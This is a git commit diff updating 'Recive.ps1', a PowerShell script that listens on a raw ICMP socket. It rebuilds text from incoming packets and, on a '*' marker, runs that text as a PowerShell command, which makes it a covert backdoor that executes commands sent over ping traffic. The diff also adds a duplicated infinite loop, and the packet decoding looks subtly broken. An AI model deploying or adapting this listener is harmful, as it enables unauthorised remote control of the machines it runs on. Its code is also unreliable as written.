036c26076c72df7801998ae3637ff37efe036740
babagrill <105714284+yahbozo@users.noreply.github.com>
2022-09-13 07:53:37 +0800

    Update Recive.ps1

--- Recive.ps1
+++ Recive.ps1
@@ -1,7 +1,7 @@
-﻿$Host.UI.RawUI.BackgroundColor = 'Black';cls
+$Host.UI.RawUI.BackgroundColor = 'Black';cls
 
 $IP = (Get-NetIPAddress | Where-Object {$_.AddressState -eq "Preferred" -and $_.ValidLifetime -lt "24:00:00"}).IPAddress
-
+Add-Type -AssemblyName PresentationFramework
 $ICMPSocket = New-Object System.Net.Sockets.Socket([Net.Sockets.AddressFamily]::InterNetwork,[Net.Sockets.SocketType]::Raw, [Net.Sockets.ProtocolType]::Icmp)
 $Address = New-Object system.net.IPEndPoint([system.net.IPAddress]::Parse($IP), 0) 
 $ICMPSocket.bind($Address)
@@ -9,18 +9,26 @@ $ICMPSocket.IOControl([Net.Sockets.IOControlCode]::ReceiveAll, [BitConverter]::G
 $buffer = new-object byte[] $ICMPSocket.ReceiveBufferSize
 $String = [System.Collections.ArrayList]@()
 
+
+
+
+
+
+
 cls
 while($True){   
+while($True){   
 $EncodedBuf = $ICMPSocket.Receive($buffer)-28;$DecodedBuf = [System.Text.Encoding]::ASCII.GetString($EncodedBuf);
+if($DecodedBuf -eq "*"){$fullstr=$String -join '';powershell -command "$fullstr";$String = [System.Collections.ArrayList]@();$DecodedBuf= ' '}
 
-if($DecodedBuf -eq "*"){$fullstr=$String -join '';powershell -command "$fullstr";$String = [System.Collections.ArrayList]@();$DecodedBuf= ''}
-
-if($DecodedBuf -eq "-"){$fullstr=$String -join '';write-host $fullstr;$String = [System.Collections.ArrayList]@();$DecodedBuf= ''}
-
-
+if($DecodedBuf -eq "-"){$fullstr=$String -join '';echo $fullstr ;$String = [System.Collections.ArrayList]@();$DecodedBuf= ' '}
 $String.Add($DecodedBuf) | out-null
+
+
+
+
 
 
 }
 
-exit
+}
